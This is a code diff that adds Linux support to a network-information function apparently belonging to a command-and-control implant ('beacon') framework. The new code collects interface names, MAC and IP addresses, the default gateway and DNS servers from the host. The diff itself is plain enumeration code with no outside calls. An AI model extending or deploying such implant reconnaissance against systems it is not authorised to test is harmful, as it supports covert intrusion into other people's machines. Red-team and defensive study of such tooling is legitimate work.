@@ -30,9 +30,16 @@
     #include <cstdio>
     #include <ctime>
     #include <cstdlib>
+    #ifdef __linux__
+        // AF_PACKET / sockaddr_ll (MAC addresses) — Linux only; other POSIX
+        // platforms parse their own link-layer API and stay on the empty path.
+        #include <netpacket/packet.h>
+        #include <net/if.h>
+    #endif
 #endif
 #include <string>
 #include <vector>
+#include <map>
 #include <sstream>
 
 namespace recon {
@@ -413,6 +420,79 @@ inline std::string get_netinfo() {
         }
     }
     if (pAddr) HeapFree(GetProcessHeap(), 0, pAddr);
+#elif defined(__linux__)
+    // Linux was a silent hole here: the whole body lived under #ifdef _WIN32,
+    // so `netinfo` returned an EMPTY string on every Linux beacon (live test
+    // 2026-10-19: netinfo on kali and ubuntu produced zero bytes while
+    // netstat, sysinfo and drives all answered). getifaddrs covers
+    // IF/MAC/IPv4/IPv6; /proc/net/route supplies the default gateway and
+    // /etc/resolv.conf the resolvers, mirroring the Windows output shape.
+    std::map<std::string, std::string> blocks;
+    struct ifaddrs* ifap = nullptr;
+    if (getifaddrs(&ifap) == 0 && ifap) {
+        for (struct ifaddrs* ifa = ifap; ifa; ifa = ifa->ifa_next) {
+            if (!ifa->ifa_name || !ifa->ifa_addr) continue;
+            std::string name = ifa->ifa_name;
+            if (name == "lo") continue;
+            int fam = ifa->ifa_addr->sa_family;
+            if (fam == AF_INET) {
+                char ip[64] = {0};
+                auto* sa = reinterpret_cast<sockaddr_in*>(ifa->ifa_addr);
+                if (inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip)))
+                    blocks[name] += std::string("  IPv4: ") + ip + "\n";
+            } else if (fam == AF_INET6) {
+                char ip[128] = {0};
+                auto* sa = reinterpret_cast<sockaddr_in6*>(ifa->ifa_addr);
+                if (inet_ntop(AF_INET6, &sa->sin6_addr, ip, sizeof(ip)))
+                    blocks[name] += std::string("  IPv6: ") + ip + "\n";
+            } else if (fam == AF_PACKET) {
+                auto* ll = reinterpret_cast<sockaddr_ll*>(ifa->ifa_addr);
+                if (ll->sll_halen > 0) {
+                    static const char hx[] = "0123456789ABCDEF";
+                    std::string mac;
+                    for (int i = 0; i < ll->sll_halen; ++i) {
+                        unsigned char b = ll->sll_addr[i];
+                        if (i) mac += ":";
+                        mac += hx[b >> 4]; mac += hx[b & 0xF];
+                    }
+                    blocks[name] += "  MAC: " + mac + "\n";
+                }
+            }
+        }
+        freeifaddrs(ifap);
+    }
+    {
+        std::ifstream rt("/proc/net/route");
+        std::string line;
+        bool header = true;
+        while (std::getline(rt, line)) {
+            if (header) { header = false; continue; }   // column titles
+            std::istringstream ls(line);
+            std::string iface, dest, gw;
+            if (!(ls >> iface >> dest >> gw)) break;
+            if (dest == "00000000" && gw != "00000000") {
+                unsigned long v = strtoul(gw.c_str(), nullptr, 16);
+                char gws[64];
+                std::snprintf(gws, sizeof(gws), "%lu.%lu.%lu.%lu",
+                              v & 0xFF, (v >> 8) & 0xFF,
+                              (v >> 16) & 0xFF, (v >> 24) & 0xFF);
+                if (blocks.count(iface)) blocks[iface] += std::string("  GW: ") + gws + "\n";
+                break;
+            }
+        }
+    }
+    // std::map keeps the interface order stable across runs.
+    for (auto& kv : blocks) out += "IF: " + kv.first + "\n" + kv.second;
+    {
+        std::ifstream rc("/etc/resolv.conf");
+        std::string line;
+        while (std::getline(rc, line)) {
+            std::istringstream ls(line);
+            std::string key, val;
+            if ((ls >> key >> val) && key == "nameserver")
+                out += "  DNS: " + val + "\n";
+        }
+    }
 #endif
     return out;
 }
